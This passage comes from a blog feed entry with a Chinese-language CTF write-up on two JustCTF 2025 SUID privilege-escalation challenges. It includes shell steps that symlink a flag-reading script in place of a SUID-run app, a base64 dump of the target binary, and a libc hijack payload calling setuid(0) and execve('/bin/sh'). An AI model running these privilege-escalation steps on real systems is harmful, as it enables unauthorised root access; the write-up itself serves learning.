class="line">    e = ast.literal_eval(expr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result of &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(expr, e))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TODO/<span class="doctag">FIXME:</span> Implement math expressions via pwnlib.util.safeeval.expr() </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to our crime shell!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Type `exit` to quit. Type `help` for help.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            process()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Oh, sorry, we got this exception:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>限制了eval函数，但是这里根本不用管这个jail，由于他会用<code>suid</code>权限来运行<code>app</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 python:<span class="number">3.13</span>.<span class="number">5</span>-bookworm</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=755 app /home/ctfplayer/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 runner /home/ctfplayer/runner</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /home/ctfplayer/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>所以进行如下操作即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf app</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;print(open(&quot;flag.txt&quot;).read())&#x27;</span> &gt; /tmp/exp.py</span><br><span class="line"><span class="built_in">ls</span> /tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /tmp/exp.py app </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./runner</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-183451.jpg" alt="1"></p><h2 id="Baby-SUID"><a href="#Baby-SUID" class="headerlink" title="Baby SUID"></a>Baby SUID</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 fedora:<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 hello /usr/bin/hello</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>里面有一个hello程序，是suid权限的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to JustCTF 2025, I鈥檓 rooting for you to succeed!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就没看出来什么了，先本地起个docker看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x run.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure><p>用<code>strace</code>看看这个文件，直接拖到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> /usr/bin/hello -w 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; hello_remote.b64 &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">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Aw4QFxsOEQESBgAAAi4BEQESBkAYl0IZAw46CzsLJxk/GQAAAwUAAhcDDjoLOwtJEwAABDQAAhcDDjoLOwtJEwAABQsBVRcAAAaJggEBk0IYEQEAAAeKggEAAhiRQhgAAAguABEBEgZAGJdCGQMOOgs7CycZPxkAAAkkAAMOPgsLCwAACg8ASRMAAAsWAEkTAw46CzsLAAAMJgBJEwAAACwAAAACAAAAAAAIAAAAAADAFAABAAAAACsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKUAAAAEAH0AAAABAQH7Dg0AAQEBAQAAAAEAAAEvbml4L3N0b3JlLzM2OHYxbGRkNnNyOHhiZzAyYTduYnByOWl2azd4Njc2LXppZy0wLjE0LjEvbGliL3ppZy9saWJjL2dsaWJjL3N5c2RlcHMveDg2XzY0AABzdGFydC0yLjMzLlMAAQAAAAAJAsAUAAEAAAAAAz4BAxAuQiM+TSQkdXYDEHRoAgEAAQF2AAAABABwAAAAAQEB+w4NAAEBAQEAAAABAAABL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvbGliYy9nbGliYy9jc3UAAGFiaS1ub3RlLlMAAQAAAHIAAAAEAGwAAAABAQH7Dg0AAQEBAQAAAAEAAAEvbml4L3N0b3JlLzM2OHYxbGRkNnNyOHhiZzAyYTduYnByOWl2azd4Njc2LXppZy0wLjE0LjEvbGliL3ppZy9saWJjL2dsaWJjL2NzdQAAaW5pdC5jAAEAAAA+AAAABAAfAAAAAQEB+w4NAAEBAQEAAAABAAABAGhlbGxvLmMAAAAAAAAJAvAUAAEAAAAAFAUFCuXXBgsuAgYAAQEfAQAABADRAAAAAQEB+w4NAAEBAQEAAAABAAABL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvbGliYy9nbGliYy9jc3UAL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvaW5jbHVkZQAAZWxmLWluaXQtMi4zMy5jAAEAAF9fc3RkZGVmX3NpemVfdC5oAAIA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</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span> -d hello_remote.b64 &gt; hello_remote</span><br><span class="line">strace ./hello_remote</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-191137.jpg" alt="1"></p><p>这里使用相对路径加载库文件，准备劫持so文件，把远程的so文件拉下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sh-4.3$ ldd /usr/bin/hello</span><br><span class="line">        linux-vdso.so.1 (0x00007f193d78a000)</span><br><span class="line">        libc.so.6 =&gt; //usr/bin/../lib64/libc.so.6 (0x00007f193d03d000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f193d400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> 98058121e919 <span class="built_in">readlink</span> -f //usr/bin/../lib64/libc.so.6</span><br><span class="line">docker <span class="built_in">cp</span> 98058121e919:/usr/lib64/libc-2.23.so ./libc_real.so.6</span><br></pre></td></tr></table></figure><p>编译成so文件，传到对应目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">   setgid(<span class="number">0</span>);</span><br><span class="line">   execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>填进去，然后覆盖原来的so文件，运行hello即可，但是这个特性只有这个特定系统才能成功</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 fedora:<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 hello /usr/bin/hello</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>我本地都成功不了，只有远程才行。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这两提权应该是通用的，但是劫持so文件的设置很麻烦，所以我没弄，软链接的python我是成功了的</p>]]></content>
    
    
    <summary type="html">suid位还是花</summary>
    
    
    
    <category term="talks" scheme="https://baozongwi.xyz/categories/talks/"/>
    
    
    <category term="姿势" scheme="https://baozongwi.xyz/tags/%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>CCF2025</title>
    <link href="https://baozongwi.xyz/posts/15226.html"/>
    <id>https://baozongwi.xyz/posts/15226.html</id>
    <published>2025-08-02T06:46:27.000Z</published>
    <updated>2025-08-08T03:52:56.443Z</updated>
    
